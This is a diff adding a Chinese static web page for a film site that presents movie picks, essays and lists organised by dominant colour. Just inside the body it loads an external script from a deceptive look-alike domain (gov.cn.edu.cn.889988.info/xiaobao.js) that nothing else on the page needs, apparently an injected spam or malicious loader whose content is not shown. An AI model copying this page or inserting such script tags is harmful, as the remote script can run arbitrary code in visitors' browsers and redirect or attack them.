@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="色悠悠电影网，用色彩读电影。每日片单、正在热映、色彩频道、观影随笔、经典片单，从色调、光影与情绪出发，读懂每一帧。">
+<meta name="keywords" content="色悠悠电影网, 色悠悠, 电影, 影视, 电影推荐, 在线电影, 电影色彩, 色调, 电影资讯, 影评, 高分电影, 片单">
+<meta name="author" content="色悠悠电影网">
+<meta name="theme-color" content="#08101c">
+<title>色悠悠电影网 · 用色彩读电影</title>
+<link rel="canonical" href="https://seyouyoudianyingwang-cn.github.io">
+<style>
+/* ============ 色悠悠电影网：色彩学 / 调色盘 ============ */
+:root{
+  --bg:#08101c; --ink:#0d1626; --card:#111c2e; --line:#253448;
+  --tx:#eaf0f7; --dim:#93a3bd;
+  --rose:#ff6b81;   /* 玫瑰 */
+  --amber:#ffb13d;  /* 琥珀 */
+  --teal:#2dd4bf;   /* 青 */
+  --violet:#a78bfa; /* 紫 */
+  --sky:#38bdf8;    /* 天蓝 */
+  --serif:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+  --mon:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:var(--sans);background:var(--bg);color:var(--tx);line-height:1.85;font-size:15px;
+  background-image:
+    radial-gradient(circle at 12% 6%,rgba(255,107,129,.18),transparent 40%),
+    radial-gradient(circle at 88% 38%,rgba(45,212,191,.14),transparent 42%);
+  background-attachment:fixed}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 24px}
+.rv{opacity:0;transform:translateY(20px);transition:.8s cubic-bezier(.2,.72,.3,1)}
+.rv.in{opacity:1;transform:none}
+@media(prefers-reduced-motion:reduce){.rv{opacity:1;transform:none;transition:none}}
+.eyebrow{font-family:var(--mon);font-size:.64rem;letter-spacing:3.5px;color:var(--amber);text-transform:uppercase}
+.sec{padding:clamp(56px,8vw,92px) 0;position:relative}
+.sechead{margin-bottom:32px;display:flex;flex-wrap:wrap;align-items:flex-end;gap:10px 22px;justify-content:space-between}
+.sechead .l h2{font-family:var(--serif);font-size:clamp(2rem,6vw,3rem);font-weight:800;letter-spacing:1px}
+.sechead .l p{color:var(--dim);font-size:.94rem;margin-top:8px;max-width:56ch}
+.sechead .l .en{font-family:var(--mon);font-size:.6rem;letter-spacing:3px;color:var(--teal);display:block;margin-bottom:6px}
+.sechead>a{font-size:.84rem;color:var(--amber);font-weight:600;white-space:nowrap;border-bottom:1px solid rgba(255,177,61,.35);padding-bottom:2px}
+
+/* ============ 导航 ============ */
+.nav{position:sticky;top:0;z-index:60;background:rgba(8,16,28,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nv{display:flex;align-items:center;height:68px;gap:14px}
+.logo{display:flex;align-items:center;gap:13px;font-family:var(--serif);font-weight:800;letter-spacing:1.5px;white-space:nowrap}
+.logo .sw{width:40px;height:40px;border-radius:11px;position:relative;overflow:hidden;
+  background:linear-gradient(135deg,var(--rose) 0 33%,var(--amber) 33% 66%,var(--teal) 66% 100%)}
+.logo .sw::after{content:"";position:absolute;inset:5px;border-radius:7px;background:rgba(8,16,28,.72);backdrop-filter:blur(2px)}
+.logo b{font-size:1.22rem}
+.logo em{font-style:normal;font-size:.54rem;color:var(--dim);letter-spacing:2px;font-family:var(--mon);display:block;line-height:1.1}
+.burger{display:none;margin-left:auto;background:none;border:1px solid var(--line);color:var(--tx);width:44px;height:44px;border-radius:11px;cursor:pointer;font-size:1.15rem}
+.tabs{display:flex;gap:4px;margin-left:auto}
+.tab{padding:9px 15px;font-size:.86rem;color:var(--dim);border-radius:11px;transition:.22s;white-space:nowrap;font-weight:500}
+.tab:hover{color:var(--tx);background:rgba(234,240,247,.07)}
+.tab.on{color:#0b1424;background:linear-gradient(90deg,var(--rose),var(--amber));font-weight:700;box-shadow:0 6px 18px rgba(255,107,129,.3)}
+
+/* ============ Hero：色卡渐变 ============ */
+.hero{overflow:hidden}
+.cvwrap{display:grid;grid-template-columns:1.02fr 1fr;gap:clamp(20px,5vw,60px);align-items:center}
+.cvwrap .tx h1{font-family:var(--serif);font-size:clamp(2.6rem,9vw,4.9rem);line-height:1.14;font-weight:800;letter-spacing:1px}
+.cvwrap .tx h1 em{font-style:normal;background:linear-gradient(90deg,var(--rose),var(--amber) 55%,var(--teal));-webkit-background-clip:text;background-clip:text;color:transparent}
+.cvwrap .tx .lede{color:var(--dim);font-size:1.02rem;margin:18px 0 24px;max-width:540px}
+.acts{display:flex;flex-wrap:wrap;gap:12px}
+.btn{border-radius:11px;padding:13px 27px;font-size:.86rem;letter-spacing:.6px;transition:.26s;cursor:pointer;font-weight:600;border:1px solid transparent}
+.btn.grad{background:linear-gradient(90deg,var(--rose),var(--amber));color:#1a130f;box-shadow:0 10px 26px rgba(255,107,129,.3)}
+.btn.grad:hover{transform:translateY(-3px)}
+.btn.ghost{background:transparent;color:var(--tx);border-color:var(--line)}
+.btn.ghost:hover{border-color:var(--teal);color:var(--teal)}
+.palette{position:relative;height:clamp(300px,54vw,500px);border-radius:20px;overflow:hidden;
+  background:linear-gradient(160deg,#13213a,#08101c);
+  box-shadow:0 34px 80px rgba(0,0,0,.6),inset 0 0 80px rgba(45,212,191,.1)}
+.palette .shard{position:absolute;border-radius:26px;filter:blur(1px);opacity:.92;mix-blend-mode:screen;animation:float 14s ease-in-out infinite alternate;will-change:transform}
+.palette .s1{width:46%;height:56%;left:-6%;top:-8%;background:radial-gradient(circle at 35% 35%,#ff6b81,#7c2238);animation-delay:-2s}
+.palette .s2{width:40%;height:48%;right:-8%;top:12%;background:radial-gradient(circle at 60% 40%,#ffb13d,#8a5a0c);animation-delay:-6s}
+.palette .s3{width:38%;height:44%;left:22%;bottom:-14%;background:radial-gradient(circle at 50% 50%,#2dd4bf,#0c5c54);animation-delay:-10s}
+.palette .frame{position:absolute;inset:22px;border:1px solid rgba(234,240,247,.22);border-radius:14px;display:flex;flex-direction:column;justify-content:space-between;padding:20px;z-index:2;backdrop-filter:blur(0)}
+.palette .frame .t{font-family:var(--mon);font-size:.62rem;letter-spacing:4px;color:rgba(234,240,247,.85)}
+.palette .frame .b{display:flex;gap:8px}
+.palette .frame .b i{width:34px;height:34px;border-radius:9px;display:block;border:1px solid rgba(255,255,255,.18)}
+@keyframes float{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(3%,-4%,0) scale(1.06)}}
+
+/* ============ ① 每日片单：色卡票根 ============ */
+.pick{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:14px}
+.pk{display:grid;grid-template-columns:7px 1fr;align-items:center;gap:16px;background:var(--ink);border:1px solid var(--line);border-radius:13px;padding:14px 18px;transition:.28s}
+.pk:hover{transform:translateY(-4px);border-color:rgba(255,177,61,.55);box-shadow:0 16px 34px rgba(0,0,0,.5)}
+.pk .sw{height:58px;border-radius:6px;align-self:stretch}
+.pk.p1 .sw{background:linear-gradient(135deg,#ff6b81,#b03a4f)}
+.pk.p2 .sw{background:linear-gradient(135deg,#ffb13d,#a1680a)}
+.pk.p3 .sw{background:linear-gradient(135deg,#2dd4bf,#0f6f64)}
+.pk.p4 .sw{background:linear-gradient(135deg,#a78bfa,#5b3fb0)}
+.pk.p5 .sw{background:linear-gradient(135deg,#38bdf8,#175e86)}
+.pk.p6 .sw{background:linear-gradient(135deg,#f472b6,#a31f5a)}
+.pk .tx h3{font-size:1.02rem;display:flex;align-items:baseline;gap:9px;flex-wrap:wrap}
+.pk .tx h3 i{font-style:normal;font-family:var(--mon);font-size:.72rem;color:var(--amber);font-weight:700}
+.pk .tx small{color:var(--dim);font-size:.74rem}
+
+/* ============ ② 正在热映：横向色卡卡组 ============ */
+.mdeck{display:flex;gap:16px;overflow-x:auto;scroll-snap-type:x mandatory;padding:4px 2px 26px}
+.mdeck::-webkit-scrollbar{height:10px}
+.mdeck::-webkit-scrollbar-thumb{background:rgba(147,163,189,.24);border-radius:8px}
+.md{flex:0 0 clamp(210px,44vw,274px);scroll-snap-align:start;background:var(--card);border:1px solid var(--line);border-radius:15px;overflow:hidden;transition:.28s}
+.md:hover{border-color:var(--rose)}
+.md .cv{aspect-ratio:4/3;position:relative;display:grid;place-items:center;font-size:3.2rem}
+.md .cv u{position:absolute;left:14px;right:14px;bottom:14px;text-decoration:none;color:#f4f8fc;font-family:var(--serif);font-weight:800;font-size:1.3rem;text-shadow:0 3px 14px rgba(0,0,0,.65);line-height:1.3}
+.md .chip{position:absolute;top:12px;left:12px;font-size:.68rem;letter-spacing:1px;color:#14213a;border-radius:20px;padding:3px 11px;font-weight:700;background:var(--amber)}
+.md .tx{padding:12px 16px 15px}
+.md .tx h3{font-size:1rem;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.md .tx span{font-size:.74rem;color:var(--dim)}
+
+/* ============ ③ 色彩频道：SVG 色相环 ============ */
+.wheelbox{display:grid;grid-template-columns:minmax(240px,340px) 1fr;gap:clamp(24px,5vw,52px);align-items:center}
+.ring{position:relative;aspect-ratio:1;border-radius:50%;
+  background:conic-gradient(from 0deg,#ff6b81,#ff9f43,#ffd93d,#6bcb77,#4dd0e1,#4d8df0,#a78bfa,#ff6b81)}
+.ring::after{content:"";position:absolute;inset:20%;border-radius:50%;background:var(--bg);box-shadow:inset 0 0 30px rgba(0,0,0,.5)}
+.ring .hub{position:absolute;inset:0;display:grid;place-items:center;z-index:3}
+.ring .hub b{font-family:var(--serif);font-size:1.5rem;letter-spacing:2px;color:var(--tx)}
+.legend{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px}
+.lg{display:flex;align-items:center;gap:12px;background:var(--ink);border:1px solid var(--line);border-radius:11px;padding:11px 14px;transition:.24s}
+.lg:hover{border-color:var(--teal);transform:translateX(4px)}
+.lg i{width:22px;height:22px;border-radius:50%;flex:0 0 auto;box-shadow:inset 0 0 0 2px rgba(255,255,255,.16)}
+.lg b{font-size:.9rem}
+.lg small{display:block;color:var(--dim);font-size:.72rem;font-family:var(--mon)}
+
+/* ============ ④ 观影随笔：分栏引文 ============ */
+.notes{display:grid;grid-template-columns:repeat(auto-fit,minmax(290px,1fr));gap:18px}
+.nt{position:relative;background:linear-gradient(160deg,var(--card),var(--ink));border:1px solid var(--line);border-top:4px solid var(--violet);border-radius:13px;padding:22px 22px 20px;transition:.28s;overflow:hidden;display:flex;flex-direction:column}
+.nt.n2{border-top-color:var(--rose)}
+.nt.n3{border-top-color:var(--teal)}
+.nt::before{content:"\201C";position:absolute;right:8px;top:-14px;font-family:Georgia,serif;font-size:7rem;line-height:1;color:rgba(167,139,250,.14)}
+.nt.n2::before{color:rgba(255,107,129,.14)}
+.nt.n3::before{color:rgba(45,212,191,.14)}
+.nt:hover{box-shadow:0 18px 42px rgba(0,0,0,.5);transform:translateY(-3px)}
+.nt .hd{display:flex;justify-content:space-between;align-items:baseline;gap:10px;margin-bottom:11px;position:relative}
+.nt .hd .no{font-family:var(--mon);font-size:.62rem;letter-spacing:2px;color:var(--amber)}
+.nt .hd .dt{font-family:var(--mon);font-size:.64rem;color:var(--dim)}
+.nt h3{font-family:var(--serif);font-size:1.24rem;letter-spacing:.5px;margin-bottom:10px;position:relative}
+.nt p{color:#c9d5e5;font-size:.88rem;-webkit-box-orient:vertical;-webkit-line-clamp:5;display:-webkit-box;overflow:hidden;position:relative;margin-top:auto}
+.nt .more{display:inline-block;margin-top:13px;font-size:.8rem;color:var(--amber);font-weight:600;letter-spacing:.6px;position:relative}
+
+/* ============ ⑤ 经典片单：原生手风琴 ============ */
+.acc{max-width:940px}
+.lst{background:var(--ink);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden;transition:.24s}
+.lst:hover{border-color:rgba(45,212,191,.6)}
+.lst>summary{display:flex;align-items:center;gap:14px;padding:15px 20px;cursor:pointer;list-style:none;font-family:var(--serif);font-size:1.12rem;font-weight:700}
+.lst>summary::-webkit-details-marker{display:none}
+.lst>summary .ix{font-family:var(--mon);font-size:1.05rem;font-weight:800;color:var(--amber);min-width:44px}
+.lst>summary .sw{width:14px;height:14px;border-radius:4px;flex:0 0 auto}
+.lst>summary .ar{margin-left:auto;color:var(--dim);transition:.3s;font-size:.82rem}
+.lst[open]>summary .ar{transform:rotate(180deg)}
+.lst .body{padding:2px 20px 18px 74px;color:var(--dim);font-size:.9rem}
+.lst .body ol{counter-reset:rn}
+.lst .body li{position:relative;padding:7px 0 7px 34px;border-bottom:1px dashed rgba(147,163,189,.26)}
+.lst .body li:last-child{border-bottom:0}
+.lst .body li::before{counter-increment:rn;content:" reel " counter(rn,decimal-leading-zero);position:absolute;left:0;top:7px;font-family:var(--mon);font-size:.6rem;letter-spacing:1px;color:var(--rose)}
+.lst .body li b{color:var(--tx);font-weight:600}
+.lst .body li small{color:var(--dim);font-size:.76rem;margin-left:8px}
+
+/* ============ 页脚 ============ */
+.foot{margin-top:8px;padding:52px 0 26px;border-top:1px solid var(--line);background:linear-gradient(0deg,rgba(255,107,129,.06),transparent 60%)}
+.fg{display:grid;grid-template-columns:repeat(auto-fit,minmax(168px,1fr));gap:26px;margin-bottom:34px}
+.fg h4{font-family:var(--mon);font-size:.72rem;letter-spacing:3px;color:var(--amber);margin-bottom:14px}
+.fg li{margin-bottom:9px}
+.fg a{color:var(--dim);font-size:.85rem}
+.fg a:hover{color:var(--teal)}
+.fg p{font-size:.84rem;color:var(--dim);max-width:300px;line-height:1.9}
+.copy{text-align:center;color:#5f6f88;font-size:.78rem;border-top:1px dashed var(--line);padding-top:22px;line-height:2}
+.copy b{color:var(--amber)}
+
+@media(max-width:900px){
+  .cvwrap{grid-template-columns:1fr}
+  .palette{height:clamp(300px,82vw,460px)}
+  .wheelbox{grid-template-columns:1fr;max-width:420px;margin:0 auto}
+  .burger{display:grid;place-items:center}
+  .tabs{position:fixed;inset:68px 0 0 100%;flex-direction:column;background:var(--bg);padding:12px;gap:2px;overflow-y:auto;transition:.32s;z-index:55;border-top:1px solid var(--line)}
+  .tabs.open{inset:68px 0 0 0}
+  .tab{border-radius:12px;padding:15px 17px}
+  .lst .body{padding-left:22px}
+}
+:focus-visible{outline:2px solid var(--teal);outline-offset:2px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 导航 ===== -->
+<header class="nav">
+  <div class="wrap nv">
+    <a class="logo" href="#top" aria-label="色悠悠电影网 首页">
+      <span class="sw" aria-hidden="true"></span>
+      <span><b>色悠悠电影网</b><em>COLOR · REEL</em></span>
+    </a>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false">☰</button>
+    <nav class="tabs" id="tabs" aria-label="主导航">
+      <a class="tab on" href="#pick">每日片单</a>
+      <a class="tab" href="#now">正在热映</a>
+      <a class="tab" href="#hue">色彩频道</a>
+      <a class="tab" href="#note">观影随笔</a>
+      <a class="tab" href="#arc">经典片单</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ===== Hero：色卡渐变 ============ -->
+<section class="sec hero" id="top">
+  <div class="wrap cvwrap">
+    <div class="tx">
+      <div class="eyebrow">COLOR · REEL · 色悠悠电影网</div>
+      <h1>用 <em>色彩</em> 读电影。</h1>
+      <p class="lede">色悠悠电影网，一间从「色调」出发的观影笔记。我们不只告诉你片子讲了什么，还告诉你它「看起来是什么颜色」——因为一部电影的脾气，往往先藏在光影里。</p>
+      <div class="acts">
+        <a class="btn grad" href="#pick">今日色卡</a>
+        <a class="btn ghost" href="#note">读一篇随笔</a>
+      </div>
+    </div>
+    <div class="palette" aria-hidden="true">
+      <div class="shard s1"></div><div class="shard s2"></div><div class="shard s3"></div>
+      <div class="frame">
+        <span class="t">PALETTE · 01</span>
+        <div class="b"><i style="background:#ff6b81"></i><i style="background:#ffb13d"></i><i style="background:#2dd4bf"></i><i style="background:#a78bfa"></i><i style="background:#38bdf8"></i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== ① 每日片单：色卡票根 ============ -->
+<section class="sec" id="pick">
+  <div class="wrap">
+    <div class="sechead">
+      <div class="l"><span class="en">01 / DAILY PALETTE</span><h2>每日片单</h2><p>六部电影，六种主色。先看颜色，再决定今晚看哪一部。</p></div>
+      <a href="#">片单归档 ›</a>
+    </div>
+    <div class="pick">
+
+      <article class="pk p1 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>布达佩斯大饭店 <i>玫瑰</i></h3><small>2014 · 喜剧 / 冒险 · 99 min</small></div>
+      </article>
+
+      <article class="pk p2 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>坠入 <i>琥珀</i></h3><small>2006 · 奇幻 / 冒险 · 117 min</small></div>
+      </article>
+
+      <article class="pk p3 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>少年派的奇幻漂流 <i>青</i></h3><small>2012 · 冒险 / 奇幻 · 127 min</small></div>
+      </article>
+
+      <article class="pk p4 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>她 <i>紫</i></h3><small>2013 · 爱情 / 科幻 · 126 min</small></div>
+      </article>
+
+      <article class="pk p5 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>海边的曼彻斯特 <i>蓝</i></h3><small>2016 · 剧情 / 家庭 · 137 min</small></div>
+      </article>
+
+      <article class="pk p6 rv">
+        <span class="sw" aria-hidden="true"></span>
+        <div class="tx"><h3>花样年华 <i>洋红</i></h3><small>2000 · 爱情 / 剧情 · 98 min</small></div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== ② 正在热映：横向色卡卡组 ============ -->
+<section class="sec" id="now" style="background:linear-gradient(180deg,transparent,rgba(255,177,61,.05))">
+  <div class="wrap">
+    <div class="sechead">
+      <div class="l"><span class="en">02 / NOW SHOWING</span><h2>正在热映</h2><p>灯还亮着，趁它没下线。</p></div>
+      <a href="#">全部热映 ›</a>
+    </div>
+    <div class="mdeck">
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#7c3aed,#2e1065)">🎆<u>星际回响</u><span class="chip">科幻</span></div>
+        <div class="tx"><h3>星际回响</h3><span>138 min · 主色：靛蓝</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#c2410c,#451a03)">🏜️<u>沙丘 2</u><span class="chip">科幻</span></div>
+        <div class="tx"><h3>沙丘 2</h3><span>166 min · 主色：赭石</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#0e7490,#083344)">🌊<u>泳者之心</u><span class="chip">传记</span></div>
+        <div class="tx"><h3>泳者之心</h3><span>129 min · 主色：青蓝</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#9f1239,#4c0519)">🥀<u>可怜的东西</u><span class="chip">奇幻</span></div>
+        <div class="tx"><h3>可怜的东西</h3><span>141 min · 主色：玫红</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#a16207,#3f2c05)">🟡<u>功夫熊猫 4</u><span class="chip">动画</span></div>
+        <div class="tx"><h3>功夫熊猫 4</h3><span>94 min · 主色：藤黄</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#166534,#052e16)">🌿<u>草木人间</u><span class="chip">剧情</span></div>
+        <div class="tx"><h3>草木人间</h3><span>118 min · 主色：苔绿</span></div>
+      </article>
+
+      <article class="md rv">
+        <div class="cv" style="background:linear-gradient(150deg,#b91c1c,#3f0c0c)">🎻<u>贝多芬传</u><span class="chip">传记</span></div>
+        <div class="tx"><h3>贝多芬传</h3><span>124 min · 主色：朱红</span></div>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== ③ 色彩频道：SVG 色相环 ============ -->
+<section class="sec" id="hue">
+  <div class="wrap">
+    <div class="sechead">
+      <div class="l"><span class="en">03 / HUE CHANNEL</span><h2>色彩频道</h2><p>电影史里最常见的六种主色。点开一种，就读懂一类电影的情绪。</p></div>
+      <a href="#">完整色谱 ›</a>
+    </div>
+    <div class="wheelbox">
+
+      <div class="ring" aria-label="电影主色色相环" role="img">
+        <div class="hub"><b>色相环</b></div>
+      </div>
+
+      <div class="legend">
+        <div class="lg"><i style="background:#ff6b81"></i><div><b>玫红</b><small>ROSE</small></div></div>
+        <div class="lg"><i style="background:#ffb13d"></i><div><b>琥珀</b><small>AMBER</small></div></div>
+        <div class="lg"><i style="background:#2dd4bf"></i><div><b>青</b><small>TEAL</small></div></div>
+        <div class="lg"><i style="background:#a78bfa"></i><div><b>紫</b><small>VIOLET</small></div></div>
+        <div class="lg"><i style="background:#38bdf8"></i><div><b>靛蓝</b><small>INDIGO</small></div></div>
+        <div class="lg"><i style="background:#6bcb77"></i><div><b>苔绿</b><small>MOSS</small></div></div>
+      </div>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== ④ 观影随笔：分栏引文 ============ -->
+<section class="sec" id="note" style="background:linear-gradient(180deg,transparent,rgba(167,139,250,.07))">
+  <div class="wrap">
+    <div class="sechead">
+      <div class="l"><span class="en">04 / COLOR NOTES</span><h2>观影随笔</h2><p>不剧透。只谈那一抹颜色，为什么让你记住了整部电影。</p></div>
+      <a href="#">全部随笔 ›</a>
+    </div>
+    <div class="notes">
+
+      <article class="nt rv">
+        <div class="hd"><span class="no">NOTE · 21</span><span class="dt">2026.03.05</span></div>
+        <h3>为什么 Wes Anderson 的电影，永远粉红与鹅黄</h3>
+        <p>粉红不是甜，是拒绝长大；鹅黄不是暖，是强行乐观。他把每一种颜色都当成一句台词来用：画面越对称、越饱和，人物内心的失序就越明显。看他的电影，其实是在看一个人如何用色卡，替自己整理情绪。</p>
+        <a class="more" href="#">继续阅读 →</a>
+      </article>
+
+      <article class="nt n2 rv">
+        <div class="hd"><span class="no">NOTE · 20</span><span class="dt">2026.02.19</span></div>
+        <h3>青与橙：好莱坞最省事的配色，为什么有效</h3>
+        <p>白天拍橙，夜里拍青，后期再把两者推向极致——这是过去二十年最主流的调色公式。它被骂「偷懒」，却很难被推翻：因为青与橙是色轮上最远的一对，对比一出来，画面就有戏。问题不在于用了它，而在于除了它，你还有没有第二种选择。</p>
+        <a class="more" href="#">继续阅读 →</a>
+      </article>
+
+      <article class="nt n3 rv">
+        <div class="hd"><span class="no">NOTE · 19</span><span class="dt">2026.01.27</span></div>
+        <h3>黑白不是没有颜色，是把选择权还给观众</h3>
+        <p>当一部电影主动放弃色彩，它其实在做一件很勇敢的事：不再替观众规定「这一刻该是什么情绪」。黑白片里的悲伤，得靠表演、构图和声音来承担——而这恰恰是电影最本来的样子。重看《罗马，不设防的城市》，你会明白什么叫「克制的力量」。</p>
+        <a class="more" href="#">继续阅读 →</a>
+      </article>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== ⑤ 经典片单：手风琴 ============ -->
+<section class="sec" id="arc">
+  <div class="wrap">
+    <div class="sechead">
+      <div class="l"><span class="en">05 / COLOR ARCHIVE</span><h2>经典片单</h2><p>按颜色挑片子，是一种被低估的选法。</p></div>
+      <a href="#">网站地图 ›</a>
+    </div>
+    <div class="acc">
+
+      <details class="lst rv" open>
+        <summary><span class="ix">01</span><span class="sw" style="background:linear-gradient(135deg,#ff6b81,#b03a4f)" aria-hidden="true"></span>玫红：关于爱与执念<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>布达佩斯大饭店</b><small>99 min · 粉红即童话，也即废墟</small></li>
+          <li><b>花样年华</b><small>98 min · 旗袍的红，是没说出口的话</small></li>
+          <li><b>坠入</b><small>117 min · 每一帧都是一幅画</small></li>
+        </ol></div>
+      </details>
+
+      <details class="lst rv">
+        <summary><span class="ix">02</span><span class="sw" style="background:linear-gradient(135deg,#ffb13d,#a1680a)" aria-hidden="true"></span>琥珀：旧时光与黄昏<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>天堂电影院</b><small>155 min · 胶片本身的颜色</small></li>
+          <li><b>阳光灿烂的日子</b><small>140 min · 记忆里的夏天永远是过曝的</small></li>
+          <li><b>海上钢琴师</b><small>165 min · 暖黄灯光下的即兴</small></li>
+        </ol></div>
+      </details>
+
+      <details class="lst rv">
+        <summary><span class="ix">03</span><span class="sw" style="background:linear-gradient(135deg,#2dd4bf,#0f6f64)" aria-hidden="true"></span>青：水、孤独与未来<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>少年派的奇幻漂流</b><small>127 min · 大海的两种蓝</small></li>
+          <li><b>水形物语</b><small>123 min · 冷色调里的温柔</small></li>
+          <li><b>她</b><small>126 min · 未来是干净的、空的、青的</small></li>
+        </ol></div>
+      </details>
+
+      <details class="lst rv">
+        <summary><span class="ix">04</span><span class="sw" style="background:linear-gradient(135deg,#a78bfa,#5b3fb0)" aria-hidden="true"></span>紫：梦境与不安<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>穆赫兰道</b><small>147 min · 紫色是梦的警报色</small></li>
+          <li><b>生命之树</b><small>139 min · 宇宙的紫，人类的渺小</small></li>
+          <li><b>犬之力</b><small>126 min · 压抑的、将要爆发的</small></li>
+        </ol></div>
+      </details>
+
+      <details class="lst rv">
+        <summary><span class="ix">05</span><span class="sw" style="background:linear-gradient(135deg,#38bdf8,#175e86)" aria-hidden="true"></span>靛蓝：夜与悬疑<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>银翼杀手 2049</b><small>164 min · 霓虹照在雨里</small></li>
+          <li><b>消失的爱人</b><small>139 min · 冷蓝的家庭惊悚</small></li>
+          <li><b>寄生虫</b><small>132 min · 地下室的光</small></li>
+        </ol></div>
+      </details>
+
+      <details class="lst rv">
+        <summary><span class="ix">06</span><span class="sw" style="background:linear-gradient(135deg,#6bcb77,#2f7a4a)" aria-hidden="true"></span>苔绿：生长与乡野<span class="ar">▾</span></summary>
+        <div class="body"><ol>
+          <li><b>小森林</b><small>111 min · 绿是最安静的叙事</small></li>
+          <li><b>隐入尘烟</b><small>133 min · 土地的耐心</small></li>
+          <li><b>海街日记</b><small>127 min · 镰仓的四季</small></li>
+        </ol></div>
+      </details>
+
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>色悠悠电影网</h4>
+        <p>用色彩读电影。电影资讯、色彩频道、观影随笔与经典片单，从色调、光影与情绪出发，读懂每一帧。</p>
+      </div>
+      <div>
+        <h4>内容</h4>
+        <ul>
+          <li><a href="#pick">每日片单</a></li>
+          <li><a href="#now">正在热映</a></li>
+          <li><a href="#hue">色彩频道</a></li>
+          <li><a href="#note">观影随笔</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>色卡</h4>
+        <ul>
+          <li><a href="#hue">玫红 · 爱与执念</a></li>
+          <li><a href="#hue">琥珀 · 旧时光</a></li>
+          <li><a href="#hue">青 · 孤独与未来</a></li>
+          <li><a href="#hue">靛蓝 · 夜与悬疑</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>站点</h4>
+        <ul>
+          <li><a href="#">选片标准</a></li>
+          <li><a href="#">版权声明</a></li>
+          <li><a href="#">投稿合作</a></li>
+          <li><a href="#">意见反馈</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      <p>SITE: <b>色悠悠电影网</b> &nbsp;·&nbsp; URL: <b>https://seyouyoudianyingwang-cn.github.io</b></p>
+      <p style="margin-top:6px">© <span id="yr"></span> 色悠悠电影网. 本页为静态演示，所有内链以 # 占位，影片条目、评分、时长、色调标注与简介均为示例数据。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var bg=document.getElementById('burger'),ts=document.getElementById('tabs');
+bg.addEventListener('click',function(){
+  var o=ts.classList.toggle('open');
+  bg.setAttribute('aria-expanded',o);
+  bg.textContent=o?'✕':'☰';
+});
+ts.addEventListener('click',function(e){if(e.target.classList.contains('tab')){ts.classList.remove('open');bg.setAttribute('aria-expanded','false');bg.textContent='☰';}});
+
+var tabs=[].slice.call(document.querySelectorAll('.tab')),
+    secs=tabs.map(function(t){return document.querySelector(t.getAttribute('href'));});
+window.addEventListener('scroll',function(){
+  var y=window.scrollY+176,cur=0;
+  secs.forEach(function(s,i){if(s&&s.offsetTop<=y)cur=i;});
+  tabs.forEach(function(t,i){t.classList.toggle('on',i===cur);});
+},{passive:true});
+
+var io=new IntersectionObserver(function(es){es.forEach(function(e){
+  if(e.isIntersecting){e.target.classList.add('in');io.unobserve(e.target);}
+});},{threshold:.14,boundary:document});
+document.querySelectorAll('.rv').forEach(function(el){io.observe(el);});
+
+document.getElementById('yr').textContent=new Date().getFullYear();
+</script>
+</body>
+</html>
